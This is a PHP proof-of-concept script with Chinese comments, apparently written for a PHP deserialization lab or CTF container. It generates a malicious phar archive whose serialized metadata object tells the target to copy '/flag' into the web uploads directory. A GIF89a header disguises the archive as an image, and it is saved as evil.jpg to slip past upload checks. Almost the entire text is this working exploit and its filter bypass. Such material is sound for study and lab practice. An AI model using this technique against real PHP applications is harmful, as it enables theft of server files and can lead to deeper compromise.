<?php
/**
 * 生成恶意 phar（攻击者本地做的事情）
 *
 * 运行方式（在容器内，需要 phar.readonly=0）：
 *   docker exec deser-php php -d phar.readonly=0 /poc/gen_phar.php
 *
 * 产物：
 *   /var/www/html/uploads/evil.jpg   ← 这就是"上传的图片"
 *   /tmp/evil.phar                   ← 原始 phar，方便 hexdump 观察
 *
 * 注意这里定义的 Thumb **故意不带魔术方法**。
 * 生成 phar 时会序列化 metadata，如果带 __destruct，
 * 脚本结束时会在生成端就直接开跑 —— 很多 writeup 在这里翻车。
 */
class Thumb
{
    public $src = '';
    public $dst = '';
}

$obj = new Thumb();
$obj->src = '/flag';                                  // 要偷的文件
$obj->dst = '/var/www/html/uploads/flag_copy.txt';    // 落到 web 目录

$pharPath = '/tmp/evil.phar';
@unlink($pharPath);

$p = new Phar($pharPath);
$p->startBuffering();
$p->addFromString('meta.txt', 'this file just needs to exist');
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");      // 伪装成 GIF：文件头校验能过
$p->setMetadata($obj);
$p->stopBuffering();

// phar 默认后缀受限，另存一份 .jpg 绕过上传检查
@unlink('/var/www/html/uploads/evil.jpg');
copy($pharPath, '/var/www/html/uploads/evil.jpg');

printf("phar 已生成\n  原始: %s (%d bytes)\n  伪装: /var/www/html/uploads/evil.jpg (%d bytes)\n",
    $pharPath, filesize($pharPath), filesize('/var/www/html/uploads/evil.jpg'));

echo "\nmetadata 序列化结果（去掉 NUL 字节便于阅读）:\n";
echo str_replace("\0", '\\0', $p->getMetadata() ? serialize($obj) : ''), "\n";
